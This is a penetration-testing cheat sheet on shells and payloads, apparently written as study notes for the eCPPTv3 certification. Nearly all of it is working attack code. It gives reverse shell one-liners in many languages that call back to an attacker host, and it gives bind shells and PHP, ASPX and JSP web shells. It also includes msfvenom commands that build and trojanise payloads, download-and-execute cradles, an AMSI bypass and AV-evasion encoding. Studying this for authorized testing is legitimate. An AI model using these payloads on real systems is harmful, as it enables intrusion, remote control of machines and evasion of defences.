# 07 — Shells & Payloads
> eCPPTv3 Cheatsheet | Attacker-Mindset Reference

---

## Table of Contents
1. [Shell Types & Mental Model](#1-shell-types--mental-model)
2. [Listeners](#2-listeners)
3. [Reverse Shell One-Liners](#3-reverse-shell-one-liners)
4. [Bind Shells](#4-bind-shells)
5. [Web Shells](#5-web-shells)
6. [MSFvenom Payload Generation](#6-msfvenom-payload-generation)
7. [Staged vs Stageless](#7-staged-vs-stageless)
8. [Shell Upgrading & Stabilisation](#8-shell-upgrading--stabilisation)
9. [Payload Delivery Methods](#9-payload-delivery-methods)
10. [Encoded & Obfuscated Payloads](#10-encoded--obfuscated-payloads)
11. [Quick-Win Checklist](#11-quick-win-checklist)

---

## 1. Shell Types & Mental Model

```
Three shell types — know when to use each:

  Reverse Shell   → Target connects BACK to you
                    Use when: target has outbound firewall rules open
                    You listen, target calls home

  Bind Shell      → Target opens a port, you connect TO it
                    Use when: you can reach the target directly
                    Target listens, you connect in

  Web Shell       → HTTP-based shell via uploaded file or injection
                    Use when: only web access available (port 80/443 open)
                    Executes OS commands through web requests
```

```bash
# Set these variables before every engagement section
export LHOST="10.10.14.2"       # your Kali IP
export LPORT="4444"             # your listening port
export TARGET="10.10.10.5"      # target IP
```

```bash
# Port selection strategy:
#   443  → blends in as HTTPS, rarely blocked outbound
#   80   → blends in as HTTP
#   8080 → common alt-web port, often allowed
#   53   → DNS, almost always allowed (UDP too)
#   4444 → default MSF, commonly signatured — avoid on sensitive engagements
```

---

## 2. Listeners

### 2.1 Netcat Listeners

```bash
# Standard TCP listener — catches any reverse shell
nc -lvnp $LPORT

# Flags:
# -l  listen mode
# -v  verbose (show connection info)
# -n  no DNS resolution (faster)
# -p  port number
```

```bash
# Persistent listener — respawns automatically after each connection closes
while true; do nc -lvnp $LPORT; done
```

```bash
# Listen on multiple ports simultaneously (background jobs)
nc -lvnp 4444 &
nc -lvnp 443 &
nc -lvnp 80 &
jobs    # list backgrounded listeners
```

### 2.2 rlwrap — Arrow Keys & History in nc

```bash
# Wrap nc with readline support — gives arrow keys, history, tab in shell
rlwrap nc -lvnp $LPORT
```

### 2.3 Socat — Fully Interactive Listener

```bash
# Socat listener — gives a fully interactive TTY from the start
# Better than nc + python upgrade for interactive programs (vim, su, ssh)
socat file:`tty`,raw,echo=0 tcp-listen:$LPORT
```

### 2.4 Metasploit Multi/Handler

```bash
# Universal MSF listener — required for staged payloads (Meterpreter)
msfconsole -q -x "
  use exploit/multi/handler;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LHOST $LHOST;
  set LPORT $LPORT;
  set ExitOnSession false;
  exploit -j
"
```

```bash
# Common payload options for handler — match what you generated with msfvenom
set PAYLOAD windows/x64/meterpreter/reverse_tcp      # Windows 64-bit staged
set PAYLOAD windows/meterpreter/reverse_tcp           # Windows 32-bit staged
set PAYLOAD linux/x64/meterpreter/reverse_tcp         # Linux 64-bit staged
set PAYLOAD php/meterpreter/reverse_tcp               # PHP staged
set PAYLOAD python/meterpreter/reverse_tcp            # Python staged
```

```bash
# ExitOnSession false — keep handler alive for multiple incoming connections
# exploit -j — run as background job so you keep the MSF console
```

---

## 3. Reverse Shell One-Liners

> Start your listener FIRST, then execute the one-liner on the target.

### 3.1 Bash

```bash
# Standard bash TCP reverse shell
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```

```bash
# Alternative syntax — avoids >& which some filters catch
bash -c 'exec bash -i &>/dev/tcp/'$LHOST'/'$LPORT' <&1'
```

```bash
# Bash UDP reverse shell (port 53 — bypasses TCP egress filters)
bash -i >& /dev/udp/$LHOST/53 0>&1
```

```bash
# Bash through /dev/tcp with exec (useful in restricted shells)
exec 5<>/dev/tcp/$LHOST/$LPORT; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### 3.2 Netcat

```bash
# Traditional netcat with -e flag (BusyBox, old nc)
nc $LHOST $LPORT -e /bin/bash
nc $LHOST $LPORT -e /bin/sh
nc $LHOST $LPORT -e cmd.exe        # Windows
```

```bash
# OpenBSD netcat — no -e flag, use named pipe instead
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
```

```bash
# Netcat with /dev/tcp fallback (if nc not available)
/bin/sh | nc $LHOST $LPORT
```

### 3.3 Python

```bash
# Python 3 — most common on modern Linux
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$LHOST'",'$LPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```bash
# Python 3 — cleaner subprocess version
python3 -c '
import socket,subprocess
s=socket.socket()
s.connect(("'$LHOST'",'$LPORT'))
import os
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

```bash
# Python 2 (legacy systems)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$LHOST'",'$LPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 3.4 Perl

```bash
# Perl reverse shell — often present on older Linux/Unix systems
perl -e 'use Socket;$i="'$LHOST'";$p='$LPORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));STDIN->fdopen(S,r);$~->fdopen(S,w);system $_ while<>;'
```

```bash
# Perl — alternative with exec
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'$LHOST':'$LPORT'");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 3.5 PHP

```bash
# PHP exec — minimal, works in CLI or RCE context
php -r '$sock=fsockopen("'$LHOST'",'$LPORT');exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
# PHP proc_open — works when exec/system are disabled
php -r '$s=fsockopen("'$LHOST'",'$LPORT');$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'
```

```bash
# PHP passthru — alternative function
php -r '$sock=fsockopen("'$LHOST'",'$LPORT');passthru("/bin/sh -i <&3 >&3 2>&3");'
```

### 3.6 Ruby

```bash
# Ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("'$LHOST'",'$LPORT').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### 3.7 Awk

```bash
# Awk reverse shell — useful when only awk is available (minimal containers)
awk 'BEGIN {s = "/inet/tcp/0/'$LHOST'/'$LPORT'"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### 3.8 Lua

```bash
# Lua reverse shell — found on some embedded devices and game servers
lua -e "require('socket');require('os');t=socket.tcp();t:connect('$LHOST','$LPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 3.9 PowerShell (Windows)

```powershell
# PowerShell TCP reverse shell — standard one-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
# PowerShell — bypass execution policy and run from file
powershell -ExecutionPolicy Bypass -File shell.ps1
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
```

```powershell
# Base64-encode PowerShell payload (avoids quote escaping issues)
# On Kali: encode any PS command
PS_CMD='$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);...'
echo -n "$PS_CMD" | iconv -t utf-16le | base64 -w 0
# Execute on target:
powershell -enc <BASE64_STRING>
```

### 3.10 Windows — cmd.exe Variations

```cmd
REM cmd via nc (if nc.exe is on target)
nc.exe $LHOST $LPORT -e cmd.exe

REM cmd via PowerShell download and exec
powershell -c "Invoke-WebRequest http://$LHOST/nc.exe -OutFile C:\Temp\nc.exe; C:\Temp\nc.exe $LHOST $LPORT -e cmd.exe"

REM cmd via mshta (HTML Application — bypasses some AV)
mshta http://$LHOST/shell.hta
```

---

## 4. Bind Shells

```bash
# Linux bind shell — target listens, you connect in
# On target:
nc -lvnp 4444 -e /bin/bash

# On Kali (connect to target):
nc $TARGET 4444
```

```bash
# Python bind shell — when nc not available on target
python3 -c '
import socket,subprocess
s=socket.socket()
s.bind(("0.0.0.0",4444))
s.listen(1)
conn,addr=s.accept()
import os
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'
```

```bash
# Socat bind shell on target
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Kali connects in:
socat - TCP:$TARGET:4444
```

```powershell
# PowerShell bind shell (Windows target)
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

---

## 5. Web Shells

### 5.1 PHP Web Shells

```php
# Minimal PHP — GET parameter execution
<?php system($_GET['cmd']); ?>
```

```php
# POST-based — avoids command showing in access logs/URL
<?php system($_POST['cmd']); ?>
```

```php
# Request-agnostic — accepts GET or POST
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

```php
# Passthru — streams output directly, better for binary output
<?php passthru($_GET['cmd']); ?>
```

```php
# Multi-function — tries each exec method until one works
<?php
$cmd = $_REQUEST['cmd'];
if(function_exists('system'))       { system($cmd); }
elseif(function_exists('passthru')) { passthru($cmd); }
elseif(function_exists('exec'))     { echo exec($cmd); }
elseif(function_exists('shell_exec')){ echo shell_exec($cmd); }
?>
```

```php
# proc_open — bypasses disable_functions restrictions on exec/system
<?php
$d=proc_open($_GET['c'],
  array(array('pipe','r'),array('pipe','w'),array('pipe','w')),
  $p);
echo stream_get_contents($p[1]);
?>
```

```bash
# Trigger web shell — send commands via curl
curl "http://$TARGET/uploads/shell.php?cmd=id"
curl "http://$TARGET/shell.php?cmd=cat+/etc/passwd"
curl -X POST "http://$TARGET/shell.php" -d "cmd=id"
```

```bash
# Trigger reverse shell from web shell
curl "http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

### 5.2 ASPX Web Shell (IIS / Windows)

```aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stm = p.StandardOutput;
        Response.Write("<pre>" + Server.HtmlEncode(stm.ReadToEnd()) + "</pre>");
    }
}
</script>
```

```bash
# Trigger ASPX shell
curl "http://$TARGET/shell.aspx?cmd=whoami"
curl "http://$TARGET/shell.aspx?cmd=ipconfig+/all"
```

### 5.3 JSP Web Shell (Tomcat / JBoss / GlassFish)

```jsp
<%@ page import="java.util.*,java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while (disr != null) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
%>
```

```bash
# Trigger JSP shell
curl "http://$TARGET:8080/shell.jsp?cmd=id"
```

### 5.4 Full Reverse Shell Web Shells

```bash
# Use Kali's built-in reverse shell — edit LHOST and LPORT before uploading
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
# Edit: $ip = 'LHOST' and $port = LPORT
# Upload → access in browser → shell arrives at listener
```

```bash
# Kali's ASPX reverse shell
cp /usr/share/webshells/aspx/cmdasp.aspx ./shell.aspx
```

```bash
# List all available Kali web shells
ls /usr/share/webshells/
ls /usr/share/webshells/php/
ls /usr/share/webshells/aspx/
ls /usr/share/webshells/jsp/
ls /usr/share/webshells/perl/
```

---

## 6. MSFvenom Payload Generation

### 6.1 Flags Reference

```bash
# Core flags
# -p  payload name
# -f  output format (exe, elf, dll, war, jar, php, aspx, raw, python, c, ps1)
# -o  output file path
# -e  encoder (x86/shikata_ga_nai, x64/xor_dynamic)
# -i  encoder iterations (more = harder to detect, larger size)
# -b  bad characters to exclude (e.g. "\x00\x0a\x0d")
# -n  NOP sled size in bytes
# -x  template executable to inject into
# -k  keep template functionality (use with -x)
# LHOST  attacker IP
# LPORT  attacker port

# List all payloads
msfvenom --list payloads

# List payloads for a platform
msfvenom --list payloads | grep windows/x64
msfvenom --list payloads | grep linux/x64
msfvenom --list payloads | grep php

# List output formats
msfvenom --list formats

# List encoders
msfvenom --list encoders
```

### 6.2 Windows Payloads

```bash
# 64-bit staged Meterpreter — standard go-to for Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell64.exe
```

```bash
# 64-bit stageless Meterpreter — use when firewall blocks multi-stage download
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell64_stageless.exe
```

```bash
# 32-bit staged Meterpreter (for older 32-bit targets)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell32.exe
```

```bash
# Plain cmd.exe shell (no Meterpreter — useful for AV evasion)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o cmd_shell.exe
```

```bash
# DLL payload — for DLL hijacking or sideloading
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o evil.dll
```

```bash
# PowerShell script payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh-cmd -o shell.ps1
```

```bash
# HTA payload — delivered via browser / phishing
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shell.hta
```

```bash
# MSI installer payload — works with AlwaysInstallElevated privesc
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o evil.msi
# Execute on target:
# msiexec /quiet /qn /i evil.msi
```

```bash
# Inject payload into a legitimate binary (trojanise)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -x /usr/share/windows-binaries/plink.exe -k -f exe -o trojan_plink.exe
```

### 6.3 Linux Payloads

```bash
# 64-bit staged Meterpreter ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell64.elf
chmod +x shell64.elf
```

```bash
# 64-bit stageless — self-contained, no handler stage
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell64_stageless.elf
```

```bash
# Plain sh reverse shell (no Meterpreter)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell_cmd.elf
```

```bash
# 32-bit Linux ELF (for i686 targets)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell32.elf
```

### 6.4 Web Payloads

```bash
# PHP Meterpreter (drop in webroot)
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

```bash
# PHP reverse shell (no Meterpreter)
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell_raw.php
```

```bash
# ASPX — IIS Windows targets
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
```

```bash
# JSP — Tomcat / Java application servers
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp
```

```bash
# WAR — deploy to Tomcat manager
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
```

### 6.5 Other Formats

```bash
# Python payload — runs on any system with Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.py
```

```bash
# Raw shellcode — for buffer overflow exploit injection
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shellcode.bin
```

```bash
# C shellcode — embed in a C dropper
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f c
```

```bash
# PowerShell shellcode runner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f ps1 -o shellcode.ps1
```

---

## 7. Staged vs Stageless

```
STAGED     (forward slash separator: windows/x64/meterpreter/reverse_tcp)
─────────────────────────────────────────────────────────────────────────
  - Payload sends a tiny "stager" first
  - Stager calls back to MSF handler and downloads the full "stage"
  - Smaller initial payload size
  - Requires reliable network connection to handler during execution
  - Handler MUST be running before payload executes
  - Better when payload size is constrained
  - Detected more easily if egress filtering blocks the stage download

STAGELESS  (underscore separator: windows/x64/meterpreter_reverse_tcp)
─────────────────────────────────────────────────────────────────────────
  - Complete payload in a single binary — no callback for 2nd stage
  - Larger file size
  - Works through strict firewalls (only needs one outbound connection)
  - Does not require handler to be running at exact execution time
  - Better for unstable or filtered network paths
  - Preferred for web delivery and file upload attacks
```

```bash
# Visual reference:
windows/x64/meterpreter/reverse_tcp     ← STAGED   (/ between meterpreter and reverse)
windows/x64/meterpreter_reverse_tcp     ← STAGELESS (_ between meterpreter and reverse)

linux/x64/meterpreter/reverse_tcp       ← STAGED
linux/x64/meterpreter_reverse_tcp       ← STAGELESS
```

```bash
# Architecture check — always match payload arch to target arch
# On Linux target:
uname -m       # x86_64 = 64-bit, i686 = 32-bit

# On Windows target:
systeminfo | findstr "System Type"
# OR from Meterpreter:
sysinfo        # shows Architecture field
```

---

## 8. Shell Upgrading & Stabilisation

> A raw netcat shell has no TTY — Ctrl+C kills it, no tab completion, no arrow keys.
> Always stabilise before running interactive programs.

### 8.1 Python PTY Method (Most Common)

```bash
# Step 1: Spawn a PTY inside the raw shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'    # Python 2 fallback

# If Python unavailable, try:
script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null

# Step 2: Background the shell
Ctrl+Z

# Step 3: Fix Kali terminal — raw mode, disable local echo
stty raw -echo; fg

# Step 4: Re-initialise terminal environment
export TERM=xterm
export SHELL=/bin/bash
export SHELL=/bin/sh      # if bash not available

# Step 5: Resize terminal to match your Kali window
# First check your local terminal size:
stty size                 # run this on Kali BEFORE backgrounding
# Then set on remote:
stty rows 50 columns 220
```

### 8.2 Socat Upgrade (Best Quality)

```bash
# Kali: start a socat listener — gives a fully interactive shell from scratch
socat file:`tty`,raw,echo=0 tcp-listen:$LPORT

# Target: connect back with socat binary (upload it first)
# Linux:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT

# Serve socat binary from Kali if not on target:
python3 -m http.server 80
# Target: wget http://$LHOST/socat -O /tmp/socat && chmod +x /tmp/socat
```

### 8.3 rlwrap (Quick Improvement)

```bash
# Wrap your netcat listener for arrow key + history support
# Not a full TTY but much better than raw nc
rlwrap nc -lvnp $LPORT
```

### 8.4 Upgrade to Meterpreter from Plain Shell

```bash
# Method 1: MSF sessions upgrade
# Background plain shell session, then:
sessions -u 1

# Method 2: Post module
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

### 8.5 Windows Shell Improvements

```cmd
REM Check if PowerShell is available — more capable than cmd
where powershell
powershell -c "whoami"
```

```powershell
# Start a PowerShell session from cmd shell
powershell -ep bypass

# Enable command history in cmd
doskey /history
```

---

## 9. Payload Delivery Methods

### 9.1 HTTP Delivery

```bash
# Serve payload from Kali
python3 -m http.server 80
python3 -m http.server 8080    # if 80 requires root

# Download on Linux target
wget http://$LHOST/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
curl http://$LHOST/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf
```

```powershell
# Download and execute on Windows target — PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/shell.exe','C:\Temp\shell.exe'); Start-Process 'C:\Temp\shell.exe'"

# Fileless — download and execute entirely in memory (no disk write)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"

# Certutil download (Microsoft-signed, bypasses some blocks)
certutil -urlcache -split -f http://$LHOST/shell.exe C:\Temp\shell.exe && C:\Temp\shell.exe
```

### 9.2 SMB Delivery

```bash
# Host payload over SMB — no download needed on target
python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password pass

# Execute directly from UNC path (fileless on target)
\\$LHOST\share\shell.exe

# Copy then execute
copy \\$LHOST\share\shell.exe C:\Temp\shell.exe && C:\Temp\shell.exe
```

### 9.3 Base64 Inline Delivery (No Network From Target)

```bash
# Encode payload on Kali
base64 shell.elf | tr -d '\n' > shell.b64
cat shell.b64    # copy output

# Paste and decode on target (no outbound network needed)
echo "BASE64STRING" | base64 -d > /tmp/shell.elf
chmod +x /tmp/shell.elf
/tmp/shell.elf
```

```powershell
# Windows — base64 decode and write to disk
[System.IO.File]::WriteAllBytes("C:\Temp\shell.exe",[System.Convert]::FromBase64String("BASE64STRING"))
```

### 9.4 Netcat Transfer

```bash
# Push file from Kali to target
# Kali (sender):
nc -lvnp 4445 < shell.elf

# Target (receiver):
nc $LHOST 4445 > /tmp/shell.elf && chmod +x /tmp/shell.elf
```

---

## 10. Encoded & Obfuscated Payloads

### 10.1 MSFvenom Encoding

```bash
# Encode with shikata_ga_nai (x86 only — polymorphic XOR)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
```

```bash
# x64 encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -e x64/xor_dynamic -i 5 -f exe -o encoded64.exe
```

```bash
# Remove bad characters (critical for buffer overflow payloads)
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  -b "\x00\x0a\x0d\x20" -f raw -o shellcode.bin
```

### 10.2 PowerShell Obfuscation

```bash
# Base64 encode any PowerShell command — avoids string detection
PS_PAYLOAD='IEX(New-Object Net.WebClient).DownloadString("http://LHOST/shell.ps1")'
echo -n "$PS_PAYLOAD" | iconv -t utf-16le | base64 -w 0
# Run: powershell -enc <output>
```

```powershell
# Character substitution obfuscation
$c = 'sy'+'stem'
# String concatenation breaks simple string matching signatures
```

```powershell
# AMSI bypass — disable before loading suspicious scripts
# Classic in-memory bypass (works on older Defender):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Then load your payload:
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')
```

### 10.3 Payload Formats Summary Table

| Format | Use Case | Platform |
|--------|----------|----------|
| `exe` | Standard Windows binary | Windows |
| `elf` | Standard Linux binary | Linux |
| `dll` | DLL hijacking / injection | Windows |
| `msi` | AlwaysInstallElevated abuse | Windows |
| `hta-psh` | Browser delivery / phishing | Windows |
| `psh` | PowerShell script | Windows |
| `war` | Tomcat manager deploy | Java |
| `jar` | Java application | Java |
| `php` | Web shell / LFI | PHP |
| `aspx` | IIS web shell | Windows/IIS |
| `raw` | Shellcode / buffer overflow | Any |
| `c` | Embed shellcode in C code | Any |
| `ps1` | PowerShell shellcode runner | Windows |
| `python` | Python environment | Any |

---

## 11. Quick-Win Checklist

```
BEFORE GENERATING PAYLOAD
[ ] Confirm target OS: Linux or Windows?
[ ] Confirm architecture: 32-bit or 64-bit? (uname -m / systeminfo)
[ ] Confirm what execution method you have (RCE, upload, macro, SQLi)
[ ] Confirm outbound connectivity: can target reach you? Which ports?
[ ] Choose staged vs stageless based on network conditions

LISTENER SETUP
[ ] Start listener BEFORE sending payload
[ ] Use rlwrap nc for plain shells (arrow key support)
[ ] Use socat for fully interactive TTY
[ ] Use MSF multi/handler for all Meterpreter payloads
[ ] Set ExitOnSession false to catch multiple callbacks

SHELL TYPES — WHEN TO USE
[ ] Reverse shell → target has outbound access (most common)
[ ] Bind shell → you can reach target port directly
[ ] Web shell → only HTTP/S access, no direct port connectivity
[ ] Meterpreter → when you need post-exploitation capabilities

AFTER CATCHING SHELL
[ ] Immediately stabilise: python3 pty + stty raw -echo + fg
[ ] Set TERM, SHELL, stty rows/columns
[ ] Confirm who you are: id / whoami / hostname
[ ] Check network: ip a / ipconfig
[ ] Start post-exploitation (see 04_post_exploitation.md)

COMMON FAILURES & FIXES
[ ] No shell received → check LHOST is reachable from target
[ ] Shell dies instantly → wrong arch (x86 vs x64) — regenerate
[ ] Staged payload fails → try stageless instead
[ ] AV deletes payload → try fileless delivery (PS download cradle)
[ ] nc shell broken → re-stabilise or socat upgrade
[ ] Meterpreter unstable → migrate to explorer.exe or svchost.exe
```

---

## Port Selection for Payloads

```
Port   Reason to use
────────────────────────────────────────────────────────
443    HTTPS — almost always allowed outbound, encrypted
80     HTTP — allowed but more inspected than 443
8080   Alt-web — common in corporate environments
53     DNS — usually allowed even through strict firewalls
8443   Alt-HTTPS — less inspected than 443
4444   Default MSF — avoid, commonly signatured by IDS
1234   Generic — unremarkable but may be blocked
```

---

*eCPPTv3 Cheatsheet — 07_shells_payloads.md*
